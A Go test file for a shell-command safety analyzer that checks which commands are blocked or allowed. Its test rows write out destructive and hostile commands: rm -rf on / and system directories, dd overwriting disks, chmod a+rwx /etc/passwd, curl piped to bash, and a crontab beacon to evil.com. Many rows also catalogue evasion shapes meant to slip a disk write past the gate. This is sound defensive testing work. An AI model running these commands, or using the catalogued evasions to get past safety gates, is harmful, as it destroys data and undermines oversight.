package analyzer

import (
	"testing"
)

func TestStructuralAnalyzer_Parse_SimplePipeline(t *testing.T) {
	a := NewStructuralAnalyzer(2)
	parsed := a.Parse("curl -sSL https://example.com | bash")

	if len(parsed.Segments) != 2 {
		t.Fatalf("expected 2 segments, got %d", len(parsed.Segments))
	}
	if parsed.Segments[0].Executable != "curl" {
		t.Errorf("segment 0: expected curl, got %s", parsed.Segments[0].Executable)
	}
	if parsed.Segments[1].Executable != "bash" {
		t.Errorf("segment 1: expected bash, got %s", parsed.Segments[1].Executable)
	}
	if len(parsed.Operators) != 1 || parsed.Operators[0] != "|" {
		t.Errorf("expected pipe operator, got %v", parsed.Operators)
	}
}

func TestStructuralAnalyzer_Parse_FlagNormalization(t *testing.T) {
	a := NewStructuralAnalyzer(2)

	tests := []struct {
		name     string
		command  string
		wantExec string
		wantFlag map[string]bool
	}{
		{
			name:     "combined short flags",
			command:  "rm -rf /",
			wantExec: "rm",
			wantFlag: map[string]bool{"r": true, "f": true},
		},
		{
			name:     "separated short flags",
			command:  "rm -r -f /",
			wantExec: "rm",
			wantFlag: map[string]bool{"r": true, "f": true},
		},
		{
			name:     "long flags",
			command:  "rm --recursive --force /",
			wantExec: "rm",
			wantFlag: map[string]bool{"recursive": true, "force": true},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := a.Parse(tt.command)
			if len(parsed.Segments) == 0 {
				t.Fatal("no segments parsed")
			}
			seg := parsed.Segments[0]
			if seg.Executable != tt.wantExec {
				t.Errorf("executable: got %s, want %s", seg.Executable, tt.wantExec)
			}
			for flag := range tt.wantFlag {
				if _, ok := seg.Flags[flag]; !ok {
					t.Errorf("missing flag %q in %v", flag, seg.Flags)
				}
			}
		})
	}
}

func TestStructuralCheck_RmRecursiveRoot(t *testing.T) {
	a := NewStructuralAnalyzer(2)

	tests := []struct {
		name    string
		command string
		wantHit bool
	}{
		{"rm -rf /", "rm -rf /", true},
		{"rm --recursive --force /", "rm --recursive --force /", true},
		{"rm -r -f /", "rm -r -f /", true},
		{"rm -rf /*", "rm -rf /*", true},
		{"sudo rm -rf /", "sudo rm -rf /", true},
		{"rm -rf ./node_modules", "rm -rf ./node_modules", false},
		{"rm -rf /tmp/build", "rm -rf /tmp/build", false},
		{"rm -f /tmp/file", "rm -f /tmp/file", false}, // no recursive
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := &AnalysisContext{RawCommand: tt.command}
			findings := a.Analyze(ctx)
			hit := hasRuleID(findings, "st-block-rm-recursive-root")
			if hit != tt.wantHit {
				t.Errorf("command %q: got hit=%v, want %v (findings: %v)",
					tt.command, hit, tt.wantHit, findingIDs(findings))
			}
		})
	}
}

func TestStructuralCheck_RmSystemDir(t *testing.T) {
	a := NewStructuralAnalyzer(2)

	tests := []struct {
		name    string
		command string
		wantHit bool
	}{
		{"rm --recursive --force /boot", "rm --recursive --force /boot", true},
		{"rm -rf /etc", "rm -rf /etc", true},
		{"sudo rm -rf /usr/local", "sudo rm -rf /usr/local", true},
		{"rm -rf ./dist", "rm -rf ./dist", false},
		{"rm -rf /home/user/project", "rm -rf /home/user/project", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := &AnalysisContext{RawCommand: tt.command}
			findings := a.Analyze(ctx)
			hit := hasRuleID(findings, "st-block-rm-system-dir")
			if hit != tt.wantHit {
				t.Errorf("command %q: got hit=%v, want %v (findings: %v)",
					tt.command, hit, tt.wantHit, findingIDs(findings))
			}
		})
	}
}

func TestStructuralCheck_DdOutputTarget(t *testing.T) {
	a := NewStructuralAnalyzer(2)

	tests := []struct {
		name      string
		command   string
		wantAllow bool
	}{
		{"dd to file", "dd if=/dev/zero of=./test.img bs=1M count=100", true},
		{"dd to block device", "dd if=/dev/zero of=/dev/sda", false},
		{"dd to nvme device", "dd if=/dev/urandom of=/dev/nvme0n1", false},

		// #3994: the ALLOW used to be granted to anything a short list of
		// Linux disk names did not name. Every one of these got ALLOW.
		{"macOS whole disk", "dd if=/dev/zero of=/dev/disk0 bs=1m", false},
		{"macOS raw disk", "dd if=/dev/zero of=/dev/rdisk2 bs=1m", false},
		{"sd/emmc", "dd if=/dev/random of=/dev/mmcblk0 count=1000", false},
		{"device-mapper volume", "dd if=/dev/zero of=/dev/mapper/vg0-root", false},
		{"dot segments into an unlisted device", "dd if=/dev/././random of=/dev/mmcblk0 count=1000", false},
		{"unknown device name", "dd if=/dev/zero of=/dev/somefuturedisk0", false},
		{"device named through a variable", "dd if=/dev/zero of=/dev/$DISK", false},
		{"relative climb into /dev", "dd if=/dev/zero of=../../dev/sda", false},

		// The safe set is the enumerable one, and it keeps its ALLOW.
		{"absolute regular file", "dd if=/dev/zero of=/tmp/x.img bs=1M count=1", true},
		{"bare relative file", "dd if=/dev/zero of=test.img count=1", true},
		{"relative climb not through dev", "dd if=/dev/zero of=../build/disk.img count=1", true},
		{"bit bucket", "dd if=/dev/zero of=/dev/null count=1", true},
		// Streams are routed outside the statement, so they are not known
		// safe (#3994 review). dd with no of= writes to stdout and never had
		// the ALLOW either.
		{"stdout is not known safe", "dd if=/dev/urandom of=/dev/stdout count=1", false},
		{"fd is not known safe", "dd if=/dev/urandom of=/dev/fd/3 count=1", false},
		{"group redirect routes stdout to a disk", "{ dd if=/dev/zero of=/dev/stdout; } > /dev/sda", false},
		{"subshell redirect routes stdout to a disk", "(dd if=/dev/zero of=/dev/stdout) > /dev/sda", false},
		{"pipeline stage routes stdout to a disk", "dd if=/dev/zero of=/dev/stdout | cat > /dev/sda", false},
		{"shm tmpfs file", "dd if=/dev/zero of=/dev/shm/scratch count=1", true},

		// Codex review of #3997: shapes that reached the ALLOW while the
		// data went to a disk.
		{"quoted later operand", "dd if=/dev/zero of=/tmp/out 'of=/dev/sda'", false},
		{"brace-expanded operands", "dd if=/dev/zero of={/tmp/out,/dev/disk0}", false},
		{"fd operand redirected to a disk", "dd if=/dev/zero of=/dev/fd/3 3>/dev/sda", false},
		{"stdout operand redirected to a disk", "dd if=/dev/zero of=/dev/stdout >/dev/sda", false},
		{"stderr redirected to a disk", "dd if=/dev/zero of=/dev/null 2>/dev/sda", false},
		{"safe dd beside an unsafe dd", "dd if=/dev/zero of=/dev/sda; dd if=/dev/zero of=/tmp/out", false},
		{"two safe dd statements", "dd if=/dev/zero of=/tmp/a; dd if=/dev/zero of=/tmp/b", true},
		{"harmless redirect keeps the ALLOW", "dd if=/dev/zero of=./x.img count=1 2>/dev/null", true},
		{"nested carrier hides a device dd", "bash <<EOF\nbash -c 'dd if=/dev/zero of=/dev/sda'\nEOF\ndd if=/dev/zero of=/tmp/x count=0", false},
		{"dd inside bash -c gets no ALLOW", "bash -c 'dd if=/dev/zero of=./x.img count=1'", false},
		{"eval carrier beside a safe dd", "eval \"$PAYLOAD\"; dd if=/dev/zero of=/tmp/x count=0", false},

		// Round 4: the ALLOW needs every statement to be a literal dd, so these
		// earlier "known gaps" are withheld too. $OUT now gets
		// ts-block-dd-zero's BLOCK, because the carve-out vouches only for a
		// literal target.
		{"dynamic target outside /dev", "dd if=/dev/zero of=$OUT count=1", false},
		{"cwd-relative device name", "cd /dev && dd if=/dev/zero of=sda", false},
		{"symlink created in the same command", "ln -s /dev/sda /tmp/out; dd if=/dev/zero of=/tmp/out", false},

		// Codex pass 3 on #3997: shapes that went BLOCK -> ALLOW once an
		// earlier round read operands after quote removal.
		{"dd with no of= beside a quoted safe dd", `dd if=/dev/zero >/dev/sda; dd if=/dev/zero "of=/tmp/x" count=0`, false},
		{"dd with no of= beside a safe dd", "dd if=/dev/zero >/dev/sda; dd if=/dev/zero of=/tmp/x count=0", false},
		{"xargs-run dd beside a safe dd", "printf x | xargs -I{} dd if=/dev/zero of=/dev/sda; dd if=/dev/zero of=/tmp/x count=0", false},
		{"find -exec dd beside a safe dd", `find /tmp -maxdepth 0 -exec dd if=/dev/zero of=/dev/sda \; ; dd if=/dev/zero of=/tmp/x count=0`, false},
		{"group stderr routed to a disk", "{ dd if=/dev/zero of=/dev/null count=1; } 2>/dev/sda", false},
		{"image written to a disk beside a safe dd", "dd if=disk.img of=/dev/sda; dd if=/dev/zero of=/tmp/x count=0", false},

		// Codex pass 4: shapes the derived segment model hid from an earlier
		// gate. The gate now walks the source AST (dd_allow_gate.go).
		{"env -C changes directory before dd", "command env -C /dev dd if=/dev/zero of=sda count=1", false},
		{"strace writes its log to a disk", "strace -o /dev/sda dd if=/dev/zero of=/dev/null count=1", false},
		{"group redirect after &&", "dd if=/dev/zero of=/dev/null count=1 && { dd if=/dev/zero of=/dev/null count=1; } 2>/dev/sda", false},
		{"group redirect inside process substitution", "dd if=/dev/zero of=/dev/null count=1 < <({ dd if=/dev/zero of=/dev/null count=1; } 2>/dev/sda)", false},
		{"dynamic redirect target in a loop", `for OUT in /dev/sda; do dd if=/dev/zero of=/dev/null count=1 2>"$OUT"; done`, false},
		{"heredoc on dd", "dd if=/dev/zero of=/dev/null count=1 <<EOF\nx\nEOF", false},
		{"sudo with an option", "sudo -D /dev dd if=/dev/zero of=sda count=1", false},
		{"sudo dd to a file", "sudo dd if=/dev/zero of=./x.img count=1", true},
		{"&& between two safe dds", "dd if=/dev/zero of=/tmp/a count=1 && dd if=/dev/zero of=/tmp/b count=1", true},
		{"stderr duplicated onto a safe stdout", "dd if=/dev/zero of=./x.img count=1 2>&1", true},

		// #3997 post-merge review: the device check compares case-folded
		// (macOS's root volume is case-insensitive), and two gate rejects
		// that no test exercised are pinned. Each row pairs a SAFE plain of= with
		// the disguised operand, so the reject under test alone decides the
		// outcome (without the safe of=, the gate's at-least-one-of= rule
		// rejects the row anyway, and the test proves nothing).
		{"upper-case spelling of /dev", "dd if=/dev/zero of=/DEV/disk0 bs=1m", false},
		// ...and the fold must not widen the harmless sinks (Codex on #4019):
		// only the exact lower-case names are sinks.
		{"upper-case bit bucket is not a sink", "dd if=/dev/zero of=/dev/NULL count=1", false},
		{"upper-case zero device is not a sink", "dd if=/dev/zero of=/dev/ZERO count=1", false},
		{"upper-case shm directory is not a sink", "dd if=/dev/zero of=/dev/SHM/disk0 count=1", false},
		{"upper-case /dev with a lower-case sink name", "dd if=/dev/zero of=/DEV/null count=1", false},
		{"upper-case sink via a redirect", "dd if=/dev/zero of=/tmp/x count=1 2>/dev/NULL", false},
		{"brace group of of= operands beside a safe of=", "dd if=/dev/zero of=/tmp/x {of=/tmp/y,of=/dev/disk0} bs=1m", false},
		{"escaped of= prefix beside a safe of=", `dd if=/dev/zero of=/tmp/x o\f=/dev/disk0 bs=1m`, false},

		// Accepted cost, pinned: a compound command no longer earns the ALLOW
		// (ts-block-dd-zero's BLOCK stands). Revisit on a real report.
		{"compound with another command (accepted cost)", "dd if=/dev/zero of=x.img count=1 && mkfs.ext4 x.img", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := &AnalysisContext{RawCommand: tt.command}
			findings := a.Analyze(ctx)
			allow := hasRuleID(findings, "st-allow-dd-to-file")
			if allow != tt.wantAllow {
				t.Errorf("command %q: got allow=%v, want %v (findings: %v)",
					tt.command, allow, tt.wantAllow, findingIDs(findings))
			}
		})
	}
}

func TestStructuralCheck_ChmodSymbolic(t *testing.T) {
	a := NewStructuralAnalyzer(2)

	tests := []struct {
		name    string
		command string
		wantHit bool
	}{
		{"chmod a+rwx /etc/passwd", "chmod a+rwx /etc/passwd", true},
		{"chmod 755 ./script.sh", "chmod 755 ./script.sh", false},
		{"chmod 644 ./config.yaml", "chmod 644 ./config.yaml", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := &AnalysisContext{RawCommand: tt.command}
			findings := a.Analyze(ctx)
			hit := hasRuleID(findings, "st-block-chmod-world-writable")
			if hit != tt.wantHit {
				t.Errorf("command %q: got hit=%v, want %v (findings: %v)",
					tt.command, hit, tt.wantHit, findingIDs(findings))
			}
		})
	}
}

func TestStructuralCheck_PipeToShell(t *testing.T) {
	a := NewStructuralAnalyzer(2)

	tests := []struct {
		name    string
		command string
		wantHit bool
	}{
		{"curl | python3", "curl -sSL https://install.python-poetry.org | python3 -", true},
		{"curl | bash", "curl -sSL https://example.com | bash", true},
		{"wget | sh", "wget -O- https://example.com/setup.sh | sh", true},
		{"curl | ruby", "curl -sSL https://example.com/install.rb | ruby", true},
		{"curl alone", "curl -o file.txt https://example.com", false},
		{"ls | grep", "ls -la | grep foo", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := &AnalysisContext{RawCommand: tt.command}
			findings := a.Analyze(ctx)
			hit := hasRuleID(findings, "st-block-pipe-to-interpreter")
			if hit != tt.wantHit {
				t.Errorf("command %q: got hit=%v, want %v (findings: %v)",
					tt.command, hit, tt.wantHit, findingIDs(findings))
			}
		})
	}
}

func TestStructuralCheck_PipeToDangerousTarget(t *testing.T) {
	a := NewStructuralAnalyzer(2)

	tests := []struct {
		name    string
		command string
		wantHit bool
	}{
		{"echo | crontab", `echo "* * * * * curl evil.com/beacon" | crontab -`, true},
		{"crontab -l (no pipe)", "crontab -l", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := &AnalysisContext{RawCommand: tt.command}
			findings := a.Analyze(ctx)
			hit := hasRuleID(findings, "st-audit-pipe-to-dangerous")
			if hit != tt.wantHit {
				t.Errorf("command %q: got hit=%v, want %v (findings: %v)",
					tt.command, hit, tt.wantHit, findingIDs(findings))
			}
		})
	}
}

// --- helpers ---

func hasRuleID(findings []Finding, ruleID string) bool {
	for _, f := range findings {
		if f.RuleID == ruleID {
			return true
		}
	}
	return false
}

func findingIDs(findings []Finding) []string {
	var ids []string
	for _, f := range findings {
		ids = append(ids, f.RuleID)
	}
	return ids
}
